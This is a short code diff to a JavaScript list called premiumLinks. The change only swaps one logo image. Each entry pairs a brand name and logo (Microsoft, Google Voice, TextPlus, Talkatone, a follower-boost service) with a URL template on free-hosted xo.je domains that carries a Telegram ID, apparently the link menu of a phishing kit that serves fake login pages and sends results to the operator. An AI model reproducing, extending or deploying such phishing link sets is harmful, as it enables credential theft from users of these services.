@@ -1,6 +1,6 @@
 const premiumLinks = [ 
 { name: "All social media link boost followers", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa1l_hp-hyt9Ll7Ct3Nv0RNXwJyoF478iPz67sPLMlxg&s=10", urlTemplate: "https://boostmass.xo.je?admin={telegram-id}" },
- { name: "Microsoft Login", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png", urlTemplate: "https://nvhopmiopa.xo.je/a/a1?id={telegram-id}" },
+ { name: "Microsoft Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShA3GucdBAdvpqnOIWjucVYrqzYfNcZdU3Dw&s", urlTemplate: "https://nvhopmiopa.xo.je/a/a1?id={telegram-id}" },
 { name: "TALKATONE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKdihiI6UETynk7yUXocw-DyCDT2SN2rzvHR93zy-arg&s=10", urlTemplate: "https://nvhopmiopa.xo.je/a/a2?id={telegram-id}" },
 { name: "TEXT PLUS LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiatsUYnQsRBiKkS2_MyNOAGVt57wnlUSwA9Nkx_60wA&s=10", urlTemplate: "https://nvhopmiopa.xo.je/a/a3?id={telegram-id}" },
 { name: "GOOGLE VOICE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSH_0wSBvxWl3WU1ufPd9-nIYhboyIpzLIka40-Bu5Lng&s=10", urlTemplate: "https://nvhopmiopa.xo.je/a/a4?id={telegram-id}" },
